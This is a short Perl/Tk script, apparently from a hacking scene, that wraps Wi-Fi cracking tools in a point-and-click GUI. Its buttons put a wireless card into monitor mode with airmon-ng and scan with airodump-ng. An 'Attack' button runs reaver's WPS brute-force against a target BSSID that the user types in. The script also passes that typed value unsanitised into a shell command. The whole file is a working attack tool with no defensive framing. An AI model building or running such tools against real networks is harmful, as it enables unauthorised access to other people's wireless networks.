#!/usr/bin/perl
#ScripT Coder:Cr0n05 
#Great's: J,all CyberHats & FatalError

use Tk;

my $mac = "";
my $mw = MainWindow->new();

$mw->geometry("450x350");
$mw->title("Air-Reaver GUI v0.0.1");

$mw->Label(-text=>"Step 1 )Reset ifconfig ==>")->place(-x => 10,-y => 10);
$mw->Button(-text=>"Reset",-width=>2,-command=>sub { &reset();})->place(-x => 160,-y=>8);

$mw->Label(-text=>"Step 2 )Airmon[wlan0] =>")->place(-x => 10,-y => 40);
$mw->Button(-text=>"Start",-width=>2,-command=>sub{ &airmon();})->place(-x => 160,-y=>40);

$mw->Label(-text=>"Step 3 )Dump[mon0] ===>")->place(-x => 10,-y => 70);
$mw->Button(-text=>"Start",-width=>2,-command=>sub{ &airodump();})->place(-x => 160,-y=>70);

$mw->Label(-text=>"Step 4 )IP MAC Target =>")->place(-x => 10,-y => 110);
my $ip = $mw->Entry(-width=>20)->place(-x => 180,-y => 110);
$mw->Button(-text=>"Attack",-width=>"60",-command=>sub{reaver($mac = $ip->get());})->place(-x=>0,-y=>140);


$mw->Label(-text=>"Step by Step ReadMe",-relief=>'groove',-width=>62,-anchor=>"center")->place(-x => 0, -y => 190);
$mw->Label(-text=>"Step 1)ifconfig down > ifconfig up")->place(-x=>0,-y=>220);
$mw->Label(-text=>"Step 2)airmon-ng start wlan0")->place(-x=>0,-y=>240);
$mw->Label(-text=>"Step 3)airodump-ng -i mon0")->place(-x=>0,-y=>260);
$mw->Label(-text=>"Step 4)reaver -i mon0 -b MAC -vv")->place(-x=>0,-y=>280);

MainLoop();

sub reset {
	system("ifconfig wlan0 down");
	system("ifconfig wlan0 up");
}
sub airmon {
	system("xterm -e airmon-ng start wlan0");
}
sub airodump {
	unless (fork) {
	system("xterm -hold -e airodump-ng -i mon0");
    exit;
}
}
sub reaver {
	unless (fork) {
	system("xterm -hold -e reaver -i mon0 -b $mac -vv");
    exit;
}
}
